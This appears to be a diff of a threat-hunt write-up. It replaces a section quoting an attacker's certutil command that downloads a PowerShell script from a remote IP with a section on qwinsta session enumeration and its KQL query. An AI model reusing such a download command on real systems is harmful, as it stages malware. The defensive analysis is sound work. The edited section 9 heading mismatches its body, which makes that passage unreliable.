@@ -162,28 +162,28 @@ DeviceProcessEvents
 
 ### 8. Discovery: Session Enumeration 
 
-Searched for evidence of terminal services enumeration and discovered that...
-
-malware download activity and discovered that the attacker utilized certutil.exe, a legitimate Windows certificate management utility, to download a PowerShell script (i.e., "ex.ps1") to the hidden staging directory using the following command: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1.
+Searched for evidence of terminal services enumeration and discovered that the command qwinsta was executed in order to enumerate RDP sessions, session IDs, session states, and logged-in users to identify active administrators and avoid detection. The attacker used this at 4:08 AM (before creating the backdoor account at 4:51 AM), likely to identify active administrators and see who was logged into the CEO's machine.
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where DeviceName == "azuki-fileserver01"
-| where ProcessCommandLine has_any ("certutil", "bitsadmin", "urlcache")
-| project TimeGenerated, DeviceName, ProcessCommandLine
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where ProcessCommandLine has_any ("qwinsta", "query session")
+| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 
 ```
-<img width="2298" height="420" alt="CH_Q9" src="https://github.com/user-attachments/assets/a336c803-3d5e-4fcd-a379-b70201e04c4e" />
+<img width="1973" height="297" alt="BT_Q12" src="https://github.com/user-attachments/assets/6f5920bd-9f6c-4929-b0dd-714fe66c5bb7" />
 
 ---
 
-### 9. Collection: Credential File Discovery
+### 9. Discovery: Domain Trust Enumeration
 
-Searched for evidence of credential file creation and discovered that the attacker created a credential file (i.e., IT-Admin-Passwords.csv)in the staging directory. This file contains exported credentials (e.g., IT administrator passwords), likely harvested from password managers, browser storage, or credential stores. The descriptive filename indicates the attacker organized their stolen data for easy identification during exfiltration.
+Searched for evidence of 
+
+credential file creation and discovered that the attacker created a credential file (i.e., IT-Admin-Passwords.csv)in the staging directory. This file contains exported credentials (e.g., IT administrator passwords), likely harvested from password managers, browser storage, or credential stores. The descriptive filename indicates the attacker organized their stolen data for easy identification during exfiltration.
 
 **Query used to locate events:**
 
